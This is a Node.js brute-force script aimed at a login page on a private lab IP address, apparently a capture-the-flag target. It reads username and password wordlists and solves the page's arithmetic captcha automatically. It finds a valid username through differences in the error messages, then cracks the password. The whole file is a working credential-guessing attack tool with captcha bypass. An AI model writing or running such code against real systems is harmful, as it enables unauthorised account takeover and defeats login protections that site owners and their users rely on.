const fs = require('fs');

// global vars
let usernames;
let passwords;
let lastRequest;
let result = [];
let url = "http://10.10.215.15/login";

// init files
try {
	const usernamesCopy = fs.readFileSync('./usernames.txt', 'utf8');
	const passwordsCopy = fs.readFileSync('./passwords.txt', 'utf8');
	usernames = (" " + usernamesCopy).slice(1);
	passwords = (" " + passwordsCopy).slice(1);
	console.log("Files are ready");
}
catch(e) {
	console.log("Error with Files");
	console.error(e);
}

// request with the captcha for username
const bruteWcaptchaUser = async (user, pswd, captcha) => {
	try {
		const options = {
			method: "POST",
			headers: {"Content-Type": "application/x-www-form-urlencoded"},
			body: `username=${user}&password=${pswd}&captcha=${captcha}`
		};
		
		const res = await fetch(url, options);	
		const data = await res.text();
		const regex = /does not exist/gm;		
		const isMatch = await data.match(regex);

		if(isMatch === undefined || isMatch === null) return [user, pswd];
		
		return [];
	}
	catch {
		console.log(`Something went wrong with`);
		console.log(user);
		console.log(pswd);
		return [];
	}
}

// request with the captcha for pass
const bruteWcaptcha = async (user, pswd, captcha) => {
	try {
		const options = {
			method: "POST",
			headers: {"Content-Type": "application/x-www-form-urlencoded"},
			body: `username=${user}&password=${pswd}&captcha=${captcha}`
		};
		
		const res = await fetch(url, options);
		const data = await res.text();	
		const regex = /Invalid password/gm;		
		const isMatch = await data.match(regex);
		
		if(isMatch === undefined || isMatch === null) return [user, pswd];
		
		return [];
	}
	catch {
		console.log(`Something went wrong with`);
		console.log(user)
		console.log(pswd)
		return [];
	}
}

// grab the captcha
const fetchCaptcha = async (user, passw) => {
	try {	
		const options = {
			method: "POST",
			headers: {"Content-Type": "application/x-www-form-urlencoded"},
			body: `username=${user}&password=${passw}`
		};
		
		const res = await fetch(url, options);
		const data = await res.text();
		const regex = /^[0-9 \-\=\?]{0,}$/gm;		
		const isMatch = await data.match(regex);
		let compute = isMatch.filter(x => x.match(/[0-9]/));

		if(compute) compute = compute[0].replaceAll(" ", "");

		return compute;
	}
	catch {
		return undefined;
	}
}

// resolve the captcha eco+
const searchOpe = (operator, numbers) => {
	let ope;

	switch(operator) {
		case "*":
			ope = parseInt(numbers[0]) * parseInt(numbers[1]);
			break;
		case "+":
			ope = parseInt(numbers[0]) + parseInt(numbers[1]);
			break;
		case "-":
			ope = parseInt(numbers[0]) - parseInt(numbers[1]);
			break;
		default:
			ope = parseInt(numbers[0]) / parseInt(numbers[1]);
			break;
	}
	
	return ope.toString();
}

// sequencing the functions
const bruteLoop = async (usr, psw) => {
	let fixEmpty = undefined;
	
	
	while(fixEmpty === undefined) {
		fixEmpty = await fetchCaptcha("user", "test");
	}

	const sign = fixEmpty.replace(/[^\-\*\+\/]/gm, "");
	const numbs = fixEmpty.split(/[\-\*\+\/]/).map(x => x.replace(/[^0-9]/gm, ""));
	const ope = searchOpe(sign, numbs);
	const res = bruteWcaptcha(usr, psw, ope);
	
	return res;
}

const bruteLoopUser = async (usr, psw) => {
	let fixEmpty = undefined;
	
	
	while(fixEmpty === undefined) {
		fixEmpty = await fetchCaptcha("user", "test");
	}

	const sign = fixEmpty.replace(/[^\-\*\+\/]/gm, "");
	const numbs = fixEmpty.split(/[\-\*\+\/]/).map(x => x.replace(/[^0-9]/gm, ""));
	const ope = searchOpe(sign, numbs);
	const res = bruteWcaptchaUser(usr, psw, ope);
	
	return res;
}

// entry point
const main = async () => {
	let usernameFound = "";

	console.log("Cracking username...");

	for(let user of usernames.split("\n")) {
		result = await bruteLoopUser(user.trim(), "test");
		
		if(result.length > 0) break;
	}
	
	if(result.length > 0) usernameFound = result[0];
	
	if(usernameFound.length > 0) {
		console.log("username found:");
		console.log(usernameFound);
	
		console.log("Cracking password...");
	
		for(let pswd of passwords.split("\n")){
			result = await bruteLoop(usernameFound, pswd.trim());
			
			if(result.length > 0) break;
		}
		
		if(result.length > 0) console.log("=> Boom baby:", result);
		else console.log("=> Not Found..");
	}
	else console.log("=>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Not Found..");
}

main();
